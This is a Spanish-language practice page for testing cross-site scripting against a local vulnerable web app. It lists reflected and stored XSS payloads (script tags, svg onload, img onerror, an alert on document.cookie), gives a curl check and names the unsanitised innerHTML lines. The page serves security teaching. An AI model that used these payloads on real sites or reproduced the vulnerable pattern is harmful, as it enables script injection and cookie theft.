URL del servidor: http://localhost:8082

Payload: <script>alert('XSS')</script>

2. XSS Reflejado - Imagen con onerror

URL: Probar aquí

3. XSS Reflejado - SVG con onload

Payload: <svg/onload=alert('XSS')>

URL: Probar aquí

Usa un elemento SVG para ejecutar código

4. XSS Reflejado - Body onload

Payload: <body onload=alert('XSS')>

URL: Probar aquí

Intenta inyectar un evento onload

5. XSS Reflejado - HTML + JavaScript

Payload: <h1 style="color:red">HACKED</h1><script>alert(document.cookie)</script>

URL: Probar aquí

Combina HTML y JavaScript para modificar la página

XSS Almacenado (Stored XSS):

6. XSS Almacenado - Formulario de comentarios

Instrucciones:

  1. Ve a http://localhost:8082
  2. En el formulario de comentarios, ingresa:
    • Nombre: <img src=x onerror=alert('XSS Almacenado')>
    • Comentario: Este es un comentario malicioso <script>alert('Persistente')</script>
  3. Haz clic en "Publicar Comentario"
  4. El payload se ejecutará cada vez que se cargue la página

Este XSS se almacena en localStorage y se ejecuta cada vez que alguien visita la página

Verificación con curl:

7. Verificar inyección desde terminal

Comando:

curl "http://localhost:8082/?search=<script>alert('XSS')</script>" | grep "searchTermSpan.innerHTML"

Verifica que el código malicioso se inyecta directamente en el HTML sin sanitización

✅ Si alguna de estas pruebas ejecuta JavaScript (muestra alertas o modifica la página), la vulnerabilidad XSS está confirmada.

📊 Información técnica:

Tipo de vulnerabilidad: Cross-Site Scripting (XSS)

Variantes presentes:

  • Reflected XSS: A través del parámetro ?search=
  • Stored XSS: A través del formulario de comentarios (localStorage)

Código vulnerable:

  • Línea con searchTermSpan.innerHTML = searchTerm; (sin sanitización)
  • Línea con commentsDiv.innerHTML += ... (sin sanitización)
